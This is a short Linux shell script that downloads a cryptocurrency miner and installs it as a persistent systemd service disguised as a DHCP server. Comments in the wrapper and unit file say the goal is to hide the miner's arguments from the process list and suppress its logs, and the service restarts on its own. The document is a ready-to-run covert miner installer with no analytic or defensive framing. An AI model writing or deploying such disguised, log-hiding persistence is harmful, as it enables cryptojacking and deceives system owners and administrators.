mkdir  /opt/containerd/bin
wget -O /opt/containerd/bin/run https://github.com/peakminer/peakminer/releases/download/v2.2.0/peakminer-2.2.0-linux-x86_64
mkdir /opt/bin/
sudo tee /opt/bin/dhcp-wrapper.sh > /dev/null << 'EOF'
#!/bin/bash
# Wrapper to masquerade as dhcpd and hide real args from /proc/<pid>/cmdline partially
REAL_CMD="/opt/containerd/bin/run --coin pearl -o kr.pearl.herominers.com:1200 -u prl1pqaz856qqzkek9t4h2750kzts2462rts8wtl7ykvks5gtqueg785s8ac4u6.gpu2"

# Execute the real command in background within this script context
exec $REAL_CMD &>/dev/null  # Redirect all output from the wrapper itself too
EOF

sudo chmod +x /opt/bin/dhcp-wrapper.sh

sudo tee /etc/systemd/system/dhcp.service > /dev/null << 'EOF'
[Unit]
Description=DHCP Server (Background Network Service)
After=network.target network-online.target nss-lookup.target

[Service]
Type=simple
Restart=always
# Run the wrapper which executes your real command but keeps its args minimal in view if configured further inside wrapper
ExecStart=/opt/bin/dhcp-wrapper.sh 

# Hide logs from default journal completely for this specific unit output
StandardOutput=null
StandardError=null

# Optional: Set nice priority to lower CPU impact visibility in some monitors
Nice=-5 
OOMScoreAdjust=-100 # Keeps memory high priority without changing name

[Install]
WantedBy=multi-user.target multi-session.target network-online.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now dhcp.service

